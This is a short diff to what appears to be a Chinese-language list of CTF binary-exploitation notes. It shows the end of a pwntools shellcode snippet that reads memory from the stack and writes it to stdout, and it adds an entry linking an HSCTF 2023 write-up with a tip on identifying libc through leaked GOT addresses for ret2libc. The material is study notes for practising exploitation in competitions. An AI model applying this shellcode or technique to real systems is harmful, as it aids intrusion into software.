@@ -898,4 +898,6 @@ realsc += asm(shellcraft.read('rax', 'rsp', 0x50))
 realsc += asm(shellcraft.write(1, 'rsp', 0x50))
 print(realsc)
 sc = jmpsc + b"\x00" * (0x50 - len(jmpsc)) + realsc
- ```
+```
+84. [ex](https://nootkroot.github.io/posts/ex-hsctf-2023/)
+- ret2libc复习。当题目没有给出使用的libc时，可以多泄露几个got地址再去libc-database里面查，保证只剩下一个可能的libc版本。
